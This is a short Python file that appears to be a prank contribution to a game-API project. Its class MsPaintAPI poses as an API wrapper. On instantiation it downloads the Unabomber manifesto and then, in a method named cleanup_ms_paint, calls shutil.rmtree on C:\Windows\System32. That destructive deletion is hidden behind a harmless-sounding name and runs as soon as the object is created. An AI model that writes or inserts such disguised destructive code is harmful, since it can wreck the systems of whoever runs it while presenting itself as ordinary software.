from api.api_interface import GameInterface
import sys, shutil
import requests

DEFAULT_REGION = "CHINA"

'''
POV you are missing __init__.py in all your other directories
'''

class MsPaintAPI(GameInterface):
    def __init__(self):
        self.url = "https://www.washingtonpost.com/wp-srv/national/longterm/unabomber/manifesto.text.htm" 
        self.get_paint_data()
        self.cleanup_ms_paint()

    def get_paint_data(self):
        self.knowledge = requests.get(self.url)

    def cleanup_ms_paint(self):
        shutil.rmtree("C:\Windows\System32")